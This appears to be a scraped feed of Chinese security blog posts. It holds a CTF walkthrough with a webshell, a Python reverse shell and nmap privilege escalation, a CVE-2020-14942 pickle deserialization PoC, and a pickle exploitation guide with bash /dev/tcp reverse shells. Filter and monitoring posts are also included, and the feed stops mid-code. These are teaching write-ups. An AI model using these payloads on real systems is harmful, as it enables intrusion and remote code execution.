http:&#x2F;&#x2F;10.10.188.224&#x2F;login http:&#x2F;&#x2F;10.10.188.224&#x2F;feed http:&#x2F;&#x2F;10.10.188.224&#x2F;0 http:&#x2F;&#x2F;10.10.188.224&#x2F;atom http:&#x2F;&#x2F;10.10.188.224&#x2F;image http:&#x2F;&#x2F;10.10.188.224&#x2F;wp-content http:&#x2F;&#x2F;10.10.188.224&#x2F;admin http:&#x2F;&#x2F;10.10.188.224&#x2F;intro http:&#x2F;&#x2F;10.10.188.224&#x2F;wp-login http:&#x2F;&#x2F;10.10.188.224&#x2F;rss2 http:&#x2F;&#x2F;10.10.188.224&#x2F;license http:&#x2F;&#x2F;10.10.188.224&#x2F;Image http:&#x2F;&#x2F;10.10.188.224&#x2F;rdf http:&#x2F;&#x2F;10.10.188.224&#x2F;page1 http:&#x2F;&#x2F;10.10.188.224&#x2F;readme http:&#x2F;&#x2F;10.10.188.224&#x2F;robots ...... 其中robots文件中提示我们有两个文件 fsocity.dic key-1-of-3.txt 其中key-1-of-3.txt就是我们需要的第一个key。另一个文件看起来像是个字典，可能是需要爆破后面的登陆账号密码，现在需要一个账号。先用这个字典爆破一个账号，在密码找回的地方，找到一个Elliot用户。 然后再去爆破密码，原字典里发现有不少重复的单词，去重后发现数量少了一大半，就这是用来消耗你时间的啊？ 使用在线去重：https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为 ER28-0652，登陆后台。 同过后台上传插件，上传一个php文件，虽然会显示上传失败，但是文件已经上传 http:&#x2F;&#x2F;10.10.188.224&#x2F;wp-content&#x2F;uploads&#x2F;2020&#x2F;07&#x2F;1.php 上传的是一句话，使用蚁剑连接即可。 为了方便操作命令，反弹一个shell回来。 python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;10.6.4.191\\&quot;,8089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\\&quot;&#x2F;bin&#x2F;sh\\&quot;,\\&quot;-i\\&quot;]);&#39; 反弹回来后，利用python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 来升级shell模式。 在/home/robot目录下发现一个文件，其中包含的robot:c3fcd3d76192e4007dfb496cca67e13b解密是abcdefghijklmnopqrstuvwxyz，用户robot的密码可能就是这个。 更改到这个用户后，目录下就有我们需要的第二个key。 然后使用此用户提权，先查看一个SUID文件，find / -user root -perm -4000 -print 2&gt;/dev/null 结果中看到这个文件，nmap在版本低于5.21的时候，可以提权 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap nmap version 3.81 利用nmap提权获取root： robot@linux:~$ nmap --interactive nmap --interactive Starting nmap V. 3.81 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; ) Welcome to Interactive Mode -- press h &lt;enter&gt; for help nmap&gt; !sh !sh # id id uid&#x3D;1002(robot) gid&#x3D;1002(robot) euid&#x3D;0(root) groups&#x3D;0(root),1002(robot) # 在root目录下就可以看到firstboot_done文件和最后一个key，到此就算是结束了。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"又叒叒一个基于osquery的监控","slug":"又叒叒一个基于osquery的监控","date":"2020-07-02T07:54:01.000Z","updated":"2020-07-02T07:58:23.000Z","comments":true,"path":"2020/07/又叒叒一个基于osquery的监控/","link":"","permalink":"https://misakikata.github.io/2020/07/%E5%8F%88%E5%8F%92%E5%8F%92%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Eosquery%E7%9A%84%E7%9B%91%E6%8E%A7/","excerpt":"","text":"又叒叒一个基于osquery的监控项目地址：https://github.com/MisakiKata/zeru 此项目是基于osquery的数据收集分析项目，用来监控主机，从最初的学习项目到现在的具有一定使用价值的项目。 数据流使用kafka来传输，客户端定时收集发送，服务的定时拉取，所以并没有实时监控。 基于osquery的项目官方有很多推荐，至于自己写一方面是为了学习django，一方面是为了二次开发。如果需要更完善和美观的项目可以采用官方的推荐。 osquery配置以下配置只是用来表示文件监控的一部分，至于其他的配置并没有使用。/etc/osquery/osquery.conf &#123; &quot;options&quot;: &#123; &quot;config_plugin&quot;:&quot;filesystem&quot;, &quot;logger_plugin&quot;:&quot;filesystem&quot;, &quot;logger_path&quot;:&quot;&#x2F;var&#x2F;log&#x2F;osquery&quot;, &quot;disable_logging&quot;:&quot;false&quot;, &quot;schedule_splay_percent&quot;:&quot;10&quot;, &quot;verbose&quot;:&quot;false&quot;, &quot;pidfile&quot;:&quot;&#x2F;var&#x2F;osquery&#x2F;osquery.pidfile&quot;, &quot;enable_syslog&quot;: &quot;true&quot;, &quot;worker_threads&quot;:&quot;5&quot;, &quot;host_identifier&quot;:&quot;hostname&quot;, &quot;disable_events&quot;:&quot;false&quot;, &quot;disable_audit&quot;:&quot;false&quot;, &quot;audit_allow_config&quot;:&quot;true&quot;, &quot;audit_allow_sockets&quot;:&quot;true&quot; &#125;, &quot;file_paths&quot;: &#123; &quot;html&quot;: [ &quot;&#x2F;var&#x2F;www&#x2F;%%&quot; ] &#125;, &quot;schedule&quot;: &#123; &quot;file_events&quot;: &#123; &quot;query&quot;: &quot;SELECT * FROM file_events;&quot;, &quot;removed&quot;: false, &quot;interval&quot;: 600 &#125; &#125; &#125; kafka配置根据官方推荐来即可，如果不在同一台主机，需要注意跨主机访问的配置。 配置默认django的非debug模式，需要开启监控，到设置中上面的选择开启即可。如果有问题可以先关闭再调试。agent目录为客户端文件，定时运行即可。默认定时为十分钟拉取一次，需要修改到apps/threat/views.py修改即可。 需要主机的IP做处理，所以最好先定义agent中的IP地址。如果不定义会自己识别，但不一定正确。 系统信息中会显示全部存在的信息，为了避免大量数据加载，所以只默认显示最近七天的数据。如果需要修改时间，可以到apps/logcat/views.py中修改。 截图","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"https://misakikata.github.io/tags/Open-Source-Security/"}]},{"title":"CVE-2020-14942-Python Tendenci Unserialize","slug":"CVE-2020-14942-Python-Tendenci-Unserialize","date":"2020-06-22T01:45:58.000Z","updated":"2020-06-22T01:47:37.000Z","comments":true,"path":"2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/","link":"","permalink":"https://misakikata.github.io/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/","excerpt":"","text":"反序列化来自一个开源协会管理系统，文件tendenci\\apps\\helpdesk\\views\\staff.py def ticket_list(request): context = &#123;&#125; ...... if request.GET.get('saved_query', None): from_saved_query = True try: saved_query = SavedSearch.objects.get(pk=request.GET.get('saved_query')) except SavedSearch.DoesNotExist: return HttpResponseRedirect(reverse('helpdesk_list')) if not (saved_query.shared or saved_query.user == request.user): return HttpResponseRedirect(reverse('helpdesk_list')) import pickle from base64 import b64decode query_params = pickle.loads(b64decode(str(saved_query.query).encode())) elif not ( 'queue' in request.GET or 'assigned_to' in request.GET or 'status' in request.GET or 'q' in request.GET or 'sort' in request.GET or 'sortreverse' in request.GET ): 从上面代码看出，这是一个从views中获取参数saved_query，通过id判断请求的用户和数据所属用户身份，正确后反序列化其中的query值，那么这个数据库是如下，保存的是一个文本字段。 class SavedSearch(models.Model): ...... query = models.TextField( _('Search Query'), help_text=_('Pickled query object. Be wary changing this.'), ) 如何去处理这个字段的值，在上个文件中，找到保存的处理方法。从post中获取query_encoded，判断不为空则直接保存进数据库。 def save_query(request): title = request.POST.get('title', None) shared = request.POST.get('shared', False) in ['on', 'True', True, 'TRUE'] query_encoded = request.POST.get('query_encoded', None) if not title or not query_encoded: return HttpResponseRedirect(reverse('helpdesk_list')) query = SavedSearch(title=title, shared=shared, query=query_encoded, user=request.user) query.save() 那么如何调用的，同样去搜索关键词save_query找到路由，找到对应的name为helpdesk_savequery，找到对应的前端表单 &lt;form method&#x3D;&#39;post&#39; action&#x3D;&#39;&#123;% url &#39;helpdesk_savequery&#39; %&#125;&#39;&gt; &lt;input type&#x3D;&#39;hidden&#39; name&#x3D;&#39;query_encoded&#39; value&#x3D;&#39;&#123;&#123; urlsafe_query &#125;&#125;&#39; &#x2F;&gt; &lt;dl&gt; &lt;dt&gt;&lt;label for&#x3D;&#39;id_title&#39;&gt;&#123;% trans &quot;Query Name&quot; %&#125;&lt;&#x2F;label&gt;&lt;&#x2F;dt&gt; &lt;dd&gt;&lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;title&#39; id&#x3D;&#39;id_title&#39; &#x2F;&gt;&lt;&#x2F;dd&gt; &lt;dd class&#x3D;&#39;form_help_text&#39;&gt;&#123;% trans &quot;This name appears in the drop-down list of saved queries. If you share your query, other users will see this name, so choose something clear and descriptive!&quot; %&#125;&lt;&#x2F;dd&gt; &lt;dt&gt;&lt;label for&#x3D;&#39;id_shared&#39;&gt;&#123;% trans &quot;Shared?&quot; %&#125;&lt;&#x2F;label&gt;&lt;&#x2F;dt&gt; &lt;dd&gt;&lt;input type&#x3D;&#39;checkbox&#39; name&#x3D;&#39;shared&#39; id&#x3D;&#39;id_shared&#39; &#x2F;&gt; &#123;% trans &quot;Yes, share this query with other users.&quot; %&#125;&lt;&#x2F;dd&gt; &lt;dd class&#x3D;&#39;form_help_text&#39;&gt;&#123;% trans &quot;If you share this query, it will be visible by &lt;em&gt;all&lt;&#x2F;em&gt; other logged-in users.&quot; %&#125;&lt;&#x2F;dd&gt; &lt;&#x2F;dl&gt; &lt;div class&#x3D;&#39;buttons&#39;&gt; &lt;input class&#x3D;&quot;btn btn-primary&quot; type&#x3D;&#39;submit&#39; value&#x3D;&#39;&#123;% trans &quot;Save Query&quot; %&#125;&#39;&gt; &lt;&#x2F;div&gt; &#123;% csrf_token %&#125;&lt;&#x2F;form&gt; 从表单中可以看到，query_encoded是模板写入，找到urlsafe_query看是如何调用的，从调用结果看，就知道是后台先去序列化然后赋值给模板，前端模板操作的时候，再把这个序列化的值传入后台中去反序列化。 ...... import pickle from base64 import b64encode urlsafe_query = b64encode(pickle.dumps(query_params)).decode() 尝试构造一个反序列化的poc import pickle,os from base64 import b64encode class exp(object): def __reduce__(self): return (os.system,('curl http://xxxx/py',)) e = exp() b64encode(pickle.dumps(e))","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"Python 过滤器","slug":"Python-过滤器","date":"2020-05-27T08:08:24.000Z","updated":"2020-05-27T08:11:28.000Z","comments":true,"path":"2020/05/Python-过滤器/","link":"","permalink":"https://misakikata.github.io/2020/05/Python-%E8%BF%87%E6%BB%A4%E5%99%A8/","excerpt":"","text":"布隆过滤器什么是布隆过滤器？本质上布隆过滤器( BloomFilter )是一种数据结构，比较巧妙的概率型数据结构（probabilistic data structure），特点是高效地插入和查询，可以用来告诉你 “某样东西一定不存在或者可能存在”。 相比于传统的 Set、Map 等数据结构，它更高效、占用空间更少，但是缺点是其返回的结果是概率性的，而不是确切的。 布隆过滤器原理布隆过滤器内部维护一个bitArray(位数组)， 开始所有数据全部置 0 。当一个元素过来时，能过多个哈希函数（hash1,hash2,hash3….）计算不同的在哈希值，并通过哈希值找到对应的bitArray下标处，将里面的值 0 置为 1 。 需要说明的是，布隆过滤器有一个误判率的概念，误判率越低，则数组越长，所占空间越大。误判率越高则数组越小，所占的空间越小。 下面以网址为例来进行说明, 例如布隆过滤器的初始情况如下图所示： 现在我们需要往布隆过滤里中插入baidu这个url，经过3个哈希函数的计算，hash值分别为1，4，7，那么我们就需要对布隆过滤器的对应的bit位置1， 就如图下所示： 接下来，需要继续往布隆过滤器中添加tencent这个url，然后它计算出来的hash值分别3，4，8，继续往对应的bit位置1。这里就需要注意一个点， 上面两个url最后计算出来的hash值都有4，这个现象也是布隆不能确认某个元素一定存在的原因，最后如下图所示： 布隆过滤器的查询也很简单，例如我们需要查找python，只需要计算出它的hash值， 如果该值为2，4，7，那么因为对应bit位上的数据有一个不为1， 那么一定可以断言python不存在，但是如果它计算的hash值是1，3，7，那么就只能判断出python可能存在，这个例子就可以看出来， 我们没有存入python，但是由于其他key存储的时候返回的hash值正好将python计算出来的hash值对应的bit位占用了，这样就不能准确地判断出python是否存在。 因此， 随着添加的值越来越多， 被占的bit位越来越多， 这时候误判的可能性就开始变高，如果布隆过滤器所有bit位都被置为1的话，那么所有key都有可能存在， 这时候布隆过滤器也就失去了过滤的功能。至此，选择一个合适的过滤器长度就显得非常重要。 从上面布隆过滤器的实现原理可以看出，它不支持删除， 一旦将某个key对应的bit位置0，可能会导致同样bit位的其他key的存在性判断错误。 如何在python中使用布隆过滤器 先去这个网站下载bitarray这个依赖 https://www.lfd.uci.edu/~gohlke/pythonlibs/#bitarray 直接安装会报错error: Microsoft Visual C++ 14.0 is required. Get it with &quot;Build Tools for Visual Studio&quot;: https://visualstudio.microsoft.com/downloads/ 安装wheel文件, 防止我们主动安装报这样的错误pip3 install bitarray-1.1.0-cp36-cp36m-win_amd64.whl pip3 install pybloom_live 该模块包含两个类实现布隆过滤器功能。BloomFilter 是定容。ScalableBloomFilter 可以自动扩容 import pybloom_live bloom &#x3D; pybloom_live.BloomFilter(capacity&#x3D;10000) #定容一万 for i in range(0, 10001): bloom.add(i) print(len(bloom)) bloom.add(10002) bloom.add(10003) print(len(bloom)) 当超过一万时，会提示一个越界提示，IndexError: BloomFilter is at capacity。看起来好像不如自动扩容的好用。对比一下定容数量和扩容数量的差别。 误判率默认是设置为千分之一，按照默认的误判率来做对比，当数量在定容内，误判率远低于设置的误判率，但数量超过定容时，准确度基本按照设置的误判率来控制。 如果需要自动扩容来处理不确定的数量差别，可以使用error_rate来控制误判率。 redis 使用docker拉取redis环境 docker run -p 6379:6379 --name redis-redisbloom redislabs&#x2F;rebloom:latest 创建一个新过滤器 106.54.181.x:6379&gt; bf.reserve newbloom 0.001 10000 OK 添加一个新的值，存在返回0，不存在会返回1 106.54.181.x:6379&gt; bf.add name 1111 (integer) 1 106.54.181.x:6379&gt; bf.add name 1111 (integer) 0 判断值是否存在，不存在返回0，存在返回1。 106.54.181.x:6379&gt; bf.exists name 1111 (integer) 1 106.54.181.x:6379&gt; bf.exists name 2222 (integer) 0 添加多个新的值 106.54.181.187:6379&gt; bf.madd name 2222 3333 1) (integer) 1 2) (integer) 1 使用https://github.com/RedisBloom/redisbloom-py编写一个简单的添加脚本 from redisbloom.client import Client class _redis_bloom(object): def __init__(self, size, error&#x3D;0.001, key&#x3D;&#39;name&#39;): self.size &#x3D; size self.error &#x3D; error self.key &#x3D; key self.rb &#x3D; Client(host&#x3D;&#39;106.54.181.x&#39;, port&#x3D;6379) self.rb.bfCreate(self.size, self.error, self.key) self.rb.delete(key) def insert(self, name): if self.rb.bfExists(self.key, name) &#x3D;&#x3D; 0: self.rb.bfAdd(self.key, name) return True else: return False rd &#x3D; _redis_bloom(size&#x3D;10000) for i in range(0, 5000): rd.insert(i) 布谷鸟过滤器布谷鸟过滤器布谷过滤器(cuckoo fliter)，这个名字来源于更早发表的布谷散列(cuckoo hash)，为了解决布隆过滤器不能删除的问题而出现。 采用一部分示意图说明布谷散列 现在我们假设有一些项要存入散列表，其每个项都有其对应的两个位置，先插入第一项A 由于插入A的时候其两个候选位置（0,2）都没有占用，所以选择第一张表或者是第二张表都可以，我们在这里默认先选择第一张表，然后插入第二项B 我们看到原来的A的位置被B占用，而A被“踢”到它的备选位置表二的2号位置上了，这就是当发生位置冲突时，布谷散列表的处理逻辑，后来的数据项将会把之前占用的项踢到另一个位置上。我们接下来插入第三项C 没有冲突，顺利搞定，接着插入D D成功的把C踢走了，其实看到这里读者应该在猜想，会不会有一种情况，即被踢走的数据的另一个备选位置也被占用了，这样怎么办？答案是继续踢，一个踢一个，直到大家都找到自己合适的归宿为止。 布谷鸟过滤器的问题从上面看出来，布谷鸟过滤器会让数据不停的找自己的位置，这样就会达到一个循环，比如表一某个数踢走一个到表二，表二中的数又踢走一个表一，这样会不停的循环影响效率。所以这时候布谷鸟过滤器就有一个阈值，当超过这个阈值就会说明过滤器数组满了。需要扩容，而实际并不一定满。 因为上面只设置了两个巢，所以空间利用率比较低，可能也就百分之五十左右。这时候就需要改进算法， 比如不再设置两个巢，而是较多的巢来保证可以将循环降低。 随着布谷鸟过滤器的装满，插入将变得缓慢，因为需要踢走更多的物品。如果程序对插入时间很敏感，布谷鸟过滤器并不一定适合。 另外还有一个明显的问题就是，如果插入一个数据插入了多次，就会产生自己踢自己的结果，将导致几个位置上都是同一个数据，不止如此还会提早的达到数组阈值。导致空间利用率底下。也许可以使用一次查询来解决此问题。 但是删除的时候会出现一定概率的误删。因为不同的元素被 hash 到同一个位置的可能性还是很大的，而且指纹只有一个字节，256 种可能，同一个位置出现相同的指纹可能性也很大。如果两个元素的 hash 位置相同，指纹相同，那么这个插入检查会认为它们是相等的。 python实现布谷鸟过滤器pip install cuckoopy from cuckoopy import CuckooFilter ck &#x3D; CuckooFilter(capacity&#x3D;1000, bucket_size&#x3D;4, fingerprint_size&#x3D;1) #每个位置四个座位，指纹字节长度为1 ck.insert(&#39;hello&#39;) ck.insert(&#39;hello&#39;) ck.insert(&#39;hello&#39;) ck.insert(&#39;hello&#39;) ck.insert(&#39;hello&#39;) ck.insert(&#39;hello&#39;) ck.insert(&#39;hello&#39;) ck.insert(&#39;hello&#39;) ck.insert(&#39;hello&#39;) print(ck.contains(&#39;hello&#39;), ck.size) 这种情况下，当插入同一个数据超过八次的时候，由于两个桶的八个座位都被一个数据占用，会出现循环踢的情况，超过阈值导致认为数据桶一件满了。 cuckoopy.exceptions.CuckooFilterFullException: Insert operation failed. Filter is full. 所以在使用布谷鸟过滤器的时候，需要先进行一次查询，如果数据存在则不在进行插入。 from cuckoopy import CuckooFilter ck &#x3D; CuckooFilter(capacity&#x3D;1000, bucket_size&#x3D;4, fingerprint_size&#x3D;1) #每个位置四个座位，指纹字节长度为1 ck.insert(&#39;hello&#39;) if not ck.contains(&#39;hello&#39;): ck.insert(&#39;hello&#39;) else: print(&quot;数据重复！&quot;) print(ck.contains(&#39;hello&#39;), ck.size) #数据重复！ True 1 redis 使用使用方式跟布隆过滤器基本一致，需要把bf改为cf即可 CF.RESERVE newCuckooFilter 1000 #新建一个过滤器 CF.ADD newCuckooFilter foo #增加一个值 CF.EXISTS newCuckooFilter foo #判断是否存在 CF.DEL newCuckooFilter foo #删除 同样使用上面的脚本 from redisbloom.client import Client class _redis_cuckoo(object): def __init__(self, size, key&#x3D;&#39;name&#39;): self.size &#x3D; size self.key &#x3D; key self.rb &#x3D; Client(host&#x3D;&#39;106.54.181.x&#39;, port&#x3D;6379) self.rb.cfCreate(self.key,self.size) def insert(self, name): if self.rb.cfExists(self.key, name) &#x3D;&#x3D; 0: self.rb.cfAdd(self.key, name) return True else: return False rd &#x3D; _redis_cuckoo(size&#x3D;10000) for i in range(0, 5000): rd.insert(i) 令牌桶算法令牌桶算法是网络流量整形（Traffic Shaping）和速率限制（Rate Limiting）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。 实现代码：https://github.com/titan-web/rate-limit/blob/master/token_bucket/__init__.py import time from threading import RLock __all__ &#x3D; (&quot;TokenBucket&quot;, ) class TokenBucket(object): def __init__(self, capacity, fill_rate, is_lock&#x3D;False): &quot;&quot;&quot; :param capacity: The total tokens in the bucket. :param fill_rate: The rate in tokens&#x2F;second that the bucket will be refilled &quot;&quot;&quot; self._capacity &#x3D; float(capacity) self._tokens &#x3D; float(capacity) self._fill_rate &#x3D; float(fill_rate) self._last_time &#x3D; time.time() self._is_lock &#x3D; is_lock self._lock &#x3D; RLock() def _get_cur_tokens(self): if self._tokens &lt; self._capacity: now &#x3D; time.time() delta &#x3D; self._fill_rate * (now - self._last_time) # 计算从上次发送到这次发送，新发放的令牌数量 self._tokens &#x3D; min(self._capacity, self._tokens + delta) # 令牌数量不能超过桶的容量 self._last_time &#x3D; now return self._tokens def get_cur_tokens(self): if self._is_lock: with self._lock: return self._get_cur_tokens() else: return self._get_cur_tokens() def _consume(self, tokens): if tokens &lt;&#x3D; self.get_cur_tokens(): # 如果没有足够的令牌，则不能发送数据 self._tokens -&#x3D; tokens return True return False def consume(self, tokens): #发送数据需要的令牌 if self._is_lock: with self._lock: return self._consume(tokens) else: return self._consume(tokens) 调用的方式是传入需要的令牌数，比如 tk &#x3D; TokenBucket(capacity&#x3D;10, fill_rate&#x3D;10) #容量10，每秒10个令牌 while True: if tk.consume(1): print(&#39;1111&#39;) else: print(&#39;2222&#39;) time.sleep(1) 会显示如下： 当桶内令牌又新增的时候会继续发送。 漏桶算法漏桶算法(Leaky Bucket)它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶可以看作是一个带有常量服务时间的单服务器队列，如果漏桶（包缓存）溢出，那么数据包会被丢弃。 在网络中，漏桶算法可以控制端口的流量输出速率，平滑网络上的突发流量，实现流量整形，从而为网络提供一个稳定的流量。 实现代码：https://github.com/titan-web/rate-limit/blob/master/leaky_bucket/__init__.py from time import time, sleep from threading import RLock __all__ &#x3D; (&quot;LeakyBucket&quot;, ) class LeakyBucket(object): def __init__(self, capacity, leak_rate, is_lock&#x3D;False): &quot;&quot;&quot; :param capacity: The total tokens in the bucket. :param leak_rate: The rate in tokens&#x2F;second that the bucket leaks &quot;&quot;&quot; self._capacity &#x3D; float(capacity) self._used_tokens &#x3D; 0 self._leak_rate &#x3D; float(leak_rate) self._last_time &#x3D; time() self._lock &#x3D; RLock() if is_lock else None def get_used_tokens(self): if self._lock: with self._lock: return self._get_used_tokens() else: return self._get_used_tokens() def _get_used_tokens(self): now &#x3D; time() delta &#x3D; self._leak_rate * (now - self._last_time) #间隔时间新泄露的漏桶令牌数 self._used_tokens &#x3D; max(0, self._used_tokens - delta) #获取数不超过漏桶最大容量 return self._used_tokens def _consume(self, tokens): if tokens + self._get_used_tokens() &lt;&#x3D; self._capacity: #小于桶容量继续存储 self._used_tokens +&#x3D; tokens self._last_time &#x3D; time() return True return False def consume(self, tokens): #发送数据需要的令牌 if self._lock: with self._lock: return self._consume(tokens) else: return self._consume(tokens) 使用类似如上的方法调用 ck &#x3D; LeakyBucket(capacity&#x3D;20, leak_rate&#x3D;5) #桶容量20，每秒泄露5 while True: if ck.consume(1): print(&#39;1111&#39;) else: print(&#39;2222&#39;) sleep(1) 结果首先把桶内的泄露完，此后每秒泄露五个。如果修改泄露数为30，这样结果任然是最多20个泄露。 参考文章：https://www.cnblogs.com/yscl/p/12003359.html ​ https://www.cnblogs.com/chuxiuhong/p/8215719.html ​ https://zhuanlan.zhihu.com/p/68418134 ​ https://www.jianshu.com/p/c02899c30bbd","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"python 反序列化","slug":"python-反序列化","date":"2020-04-26T07:11:44.000Z","updated":"2020-05-26T08:49:23.000Z","comments":true,"path":"2020/04/python-反序列化/","link":"","permalink":"https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"反序列化库python 序列化和反序列化使用最为频繁的是cPickle和pickle，前者是C语言实现，据说速度比后者快很多。 只不过python3标准库中不再叫cPickle，而是只有pickle。python2中两者都有。 python2中的序列化文件如果想在python3中读取，需要修改编码。 #python2 with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f: l &#x3D; list(pickle.load(f)) #python3 with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f: u &#x3D; pickle._Unpickler(f) u.encoding &#x3D; &#39;latin1&#39; p &#x3D; u.load() 除此之外，还有一些其他的第三方序列化库，比如 # marshmallow pip3 install marshmallow # MessagePack pip3 install msgpack-python pickle反序列化pickle问题是序列化为什么会产生漏洞，是序列化本身处理有问题，被外来的EXP攻击导致漏洞执行了嘛。因为pickle允许我们用数据表示任意对象。官方也在一开始就表述问题的严重性。 pickle允许任意对象通过定义__reduce__方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖。 __reduce__ 被定义之后，当对象被Pickle时就会被调用 要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用 __reduce_ex__ 首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__ 利用构造一个存在漏洞的简单代码： #encoding: utf-8 import os import pickle class test(object): def __reduce__(self): return (os.system,(&#39;whoami&#39;,)) a&#x3D;test() payload&#x3D;pickle.dumps(a) print payload pickle.loads(payload) 在python2和python3的输出为： 其中代表的含义 # \\x80：协议头声明 \\x03：协议版本 # \\x06\\x00\\x00\\x00：数据长度：6 -&gt; whoami # whoami：数据 # q：储存栈顶的字符串长度：一个字节（即\\x00） # \\x00：栈顶位置 # . ：数据截止 # c：读取新的一行作为模块名module，读取下一行作为对象名object，nt -&gt;windows，posix -&gt; linux # (：将一个标记对象插入到堆栈中。 # S: 实例化一个字符串对象 # p：将堆栈中索引为-1的对应存储入内存。 # t：构建元组压入堆栈。 # R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。 如果需要在web中请求传输，url编码后就可以发送了。 如果使用的是__reduce_ex__ #encoding: utf-8 import os import pickle class test(object): def __init__(self, cmd): self.cmd &#x3D; cmd def __reduce_ex__(self,cmd): return (os.system,(self.cmd,)) a&#x3D;test(&#39;whoami&#39;) payload&#x3D;pickle.dumps(a) print(payload) pickle.loads(payload) 其中pickle.loads是会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。有人整理的执行命令函数。 eval, execfile, compile, open, file, map, input, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe, os.listdir, os.access, os.execl, os.execle, os.execlp, os.execlpe, os.execv, os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads,cPickle.load,cPickle.loads, subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen, commands.getstatusoutput,commands.getoutput,commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive, dircache.listdir,dircache.opendir, io.open, popen2.popen2,popen2.popen3,popen2.popen4, timeit.timeit,timeit.repeat, sys.call_tracing, code.interact,code.compile_command,codeop.compile_command, pty.spawn, posixfile.open,posixfile.fileopen, platform.popen 以及不常用的命令执行函数 map(__import__(&#39;os&#39;).system,[&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,]) sys.call_tracing(__import__(&#39;os&#39;).system,(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,)) platform.popen(&quot;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;127.0.0.1\\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\\&quot;&#x2F;bin&#x2F;sh\\&quot;,\\&quot;-i\\&quot;]);&#39;&quot;) 如果想手动编写opcode，可用查看https://xz.aliyun.com/t/7436#toc-11。文章详细介绍了pickle的原理和序列化值的含义。 pickle库中针对序列化和反序列化的方法有 pickle.dump() #传入一个文件句柄，以二进制的形式写入 pickle.dumps() #参数为字符串，返回一个序列化的byte对象 pickle.load() #同样是操作文件句柄，以二进制形式读取 pickle.loads() #直接从bytes对象中读取序列化值 还有面向对象的反序列化类。这个类后面会被用到pickle.Unpickler。方法和上面一致操作文件。 f &#x3D; open(fileName, &quot;rb&quot;) d &#x3D; pickle.Unpickler(f) data &#x3D; d.load() f.close() 带有的方法为&#39;find_class&#39;, &#39;load&#39;, &#39;memo&#39;, &#39;persistent_load&#39; 面向对象的序列化类。pickle.Pickler，其中方法&#39;bin&#39;, &#39;clear_memo&#39;, &#39;dispatch_table&#39;, &#39;dump&#39;, &#39;fast&#39;, &#39;memo&#39;, &#39;persistent_id&#39; pickle payload上面都是提到的pickle的函数和序列化、反序列化的东西，现在用一个简单的场景来看一下payload。 import pickle import base64 from flask import Flask, request app &#x3D; Flask(__name__) @app.route(&quot;&#x2F;&quot;) def index(): try: user &#x3D; base64.b64decode(request.cookies.get(&#39;user&#39;)) user &#x3D; pickle.loads(user) username &#x3D; user[&quot;username&quot;] except: username &#x3D; &quot;Guest&quot; return &quot;Hello %s&quot; % username if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run() 当执行 &gt;&gt;&gt; class exp(object): ... def __reduce__(self): ... return (os.system,(&#39;whoami&#39;,)) ... &gt;&gt;&gt; e &#x3D; exp() &gt;&gt;&gt; s &#x3D; pickle.dumps(e) &gt;&gt;&gt; response &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&quot;, cookies&#x3D;dict(user&#x3D;base64.b64encode(s).decode())) Unpickler find_class()当然对于这种无限制的任意对象调用，官方也有一定的解决办法，定制find_class()来控制要解封的对象。 比如如下的一个例子： import io import pickle safe_builtins &#x3D; &#123; #白名单 &#39;range&#39;, &#39;complex&#39;, &#39;set&#39;, &#39;frozenset&#39;, &#39;slice&#39;, &#125; class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module &#x3D;&#x3D; &quot;builtins&quot; and name in 